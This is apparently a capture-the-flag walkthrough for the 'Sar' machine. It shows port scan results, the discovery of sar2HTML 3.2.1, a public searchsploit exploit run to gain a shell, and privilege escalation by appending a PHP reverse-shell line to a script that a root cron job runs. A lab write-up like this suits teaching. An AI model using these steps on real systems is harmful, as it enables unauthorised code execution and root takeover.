----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Sar
# 1/1/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

----------------------------------------------------
# Robots.txt
----------------------------------------------------
got robots.txt
sar2HTML

----------------------------------------------------
# vulnerable service on website (website/sar2HTML)
----------------------------------------------------
sar2html Ver 3.2.1
exploit available on searchsploit
searchsploit -m 49344.py
python3 49344.py 

----------------------------------------------------
# got shell(little unstable but it will do the job)
----------------------------------------------------

----------------------------------------------------
# Privilege escalation
----------------------------------------------------
cat /etc/crontab
/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh

we know root running finally.sh and finally.sh running write.sh
we can edit write.sh
so download php reverse shell
set up listener
and add line "php ./shell.php" to write.sh
echo "php ./shell.php" >> /var/www/html/write.sh
